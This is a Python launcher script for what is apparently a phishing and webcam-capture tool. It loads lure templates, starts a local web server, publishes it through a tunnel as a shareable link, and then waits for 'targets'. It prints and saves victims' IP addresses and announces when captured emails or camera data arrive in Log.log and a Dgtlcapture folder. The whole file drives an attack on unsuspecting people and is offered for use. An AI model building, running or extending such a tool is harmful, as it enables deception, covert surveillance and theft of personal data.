import os, sys, time, signal
import types

def load_module(name, path):
    # Pehle bina extension try karein, agar nahi mile toh .py
    if not os.path.isfile(path):
        path_py = path + '.py'
        if os.path.isfile(path_py):
            path = path_py
        else:
            raise FileNotFoundError(f"File '{path}' or '{path_py}' not found.")
    with open(path, 'r') as f:
        code = f.read()
    module = types.ModuleType(name)
    module.__file__ = path
    sys.modules[name] = module
    exec(code, module.__dict__)
    return module

# Load all modules in correct order
load_module('config', 'config')
load_module('templates', 'templates')
load_module('handler', 'handler')
load_module('server', 'server')
load_module('tunnel', 'tunnel')
load_module('utils', 'utils')

# Import into current namespace
from utils import print_banner, select_template, generate_index, find_free_port
from server import start_server
from tunnel import start_tunnel

# Globals
PORT = None
SERVER_PROCESS = None
TUNNEL_PROCESS = None

def stop_all():
    global SERVER_PROCESS, TUNNEL_PROCESS
    if TUNNEL_PROCESS:
        TUNNEL_PROCESS.terminate()
        TUNNEL_PROCESS.wait()
        TUNNEL_PROCESS = None
    if SERVER_PROCESS:
        SERVER_PROCESS.shutdown()
        SERVER_PROCESS = None
    sys.exit(0)

def signal_handler(sig, frame):
    print("\n\033[1;31m[!] Stopping...\033[0m")
    stop_all()

def main():
    global PORT, SERVER_PROCESS, TUNNEL_PROCESS
    signal.signal(signal.SIGINT, signal_handler)
    print_banner()

    template, fest_name, yt_id = select_template()
    PORT = find_free_port()
    print(f"\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Using port: {PORT}\033[0m")

    print(f"\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting HTTP server on port {PORT}...\033[0m")
    SERVER_PROCESS = start_server(PORT)
    time.sleep(1)

    link = start_tunnel(PORT)
    if not link:
        print("\033[1;31m[!] No tunnel URL obtained. Exiting.\033[0m")
        stop_all()
    print(f"\033[1;92m[+] Public Link:\033[0m \033[1;77m{link}\033[0m")
    generate_index(template, link, fest_name, yt_id)

    print("\n\033[1;92m[\033[0m\033[1;77m*\033[0m\033[1;92m] Waiting targets,\033[0m\033[1;77m Press Ctrl + C to exit...\033[0m")
    while True:
        time.sleep(1)
        if os.path.exists('ip.txt'):
            with open('ip.txt', 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if line.startswith('IP:'):
                        ip = line.split('IP:')[1].strip()
                        print(f"\n\033[1;93m[\033[0m\033[1;77m+\033[0m\033[1;93m] IP:\033[0m\033[1;77m {ip}\033[0m")
                        with open('saved.ip.txt', 'a') as sf:
                            sf.write(f"IP: {ip}\n")
            os.remove('ip.txt')
        if os.path.exists('Log.log'):
            with open('Log.log', 'r') as f:
                content = f.read()
                if 'Email:' in content or 'Cam' in content:
                    print("\n\033[1;92m[\033[0m+\033[1;92m] Data received! Check Log.log and Dgtlcapture folder\033[0m")
            os.remove('Log.log')

if __name__ == '__main__':
    main()